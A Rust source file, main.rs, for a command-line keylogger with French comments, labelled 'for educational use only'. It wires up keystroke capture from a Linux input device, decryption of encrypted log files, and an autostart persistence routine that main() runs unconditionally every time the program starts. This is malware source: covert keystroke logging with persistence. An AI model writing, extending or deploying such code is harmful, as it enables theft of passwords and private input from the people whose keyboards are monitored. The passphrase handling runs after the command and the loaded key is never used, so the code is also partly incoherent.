mod config;
mod modules;

use std::env;
use modules::key_manager::get_or_create_key;
use std::io::{self, Write};

use clap::{Parser, Subcommand};

/// 🎯 Keylogger en Rust — à usage éducatif uniquement
#[derive(Parser)]
#[command(name = "Keylogger")]
#[command(about = "Capture et chiffre les frappes clavier", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Lance le keylogger (nécessite les droits root)
    Start {
        /// Chemin vers le device clavier (/dev/input/eventX)
        #[arg(short, long, default_value = "/dev/input/event3")]
        device: String,
    },

    /// Lit les logs chiffrés (logs.enc) et affiche les frappes déchiffrées
    Read {
        /// Fichier de logs chiffrés à lire
        #[arg(short, long, default_value = "logs.enc")]
        file: String,
    },
}

fn main() {
    modules::persistence::setup_autostart_linux().expect("Autostart setup failed");
    let cli = Cli::parse();

    match &cli.command {
        Commands::Start { device } => {
            modules::logger::start_keylogger(device);
        }
        Commands::Read { file } => {
            modules::decrypt::read_encrypted_logs(file);
        }
    }
    print!(" Entrez votre passphrase : ");
    io::stdout().flush().unwrap();
    
    let mut passphrase = String::new();
    io::stdin().read_line(&mut passphrase).unwrap();
    let passphrase = passphrase.trim();

    let key = get_or_create_key(passphrase);
    println!("✔ Clé chargée avec succès !");
}
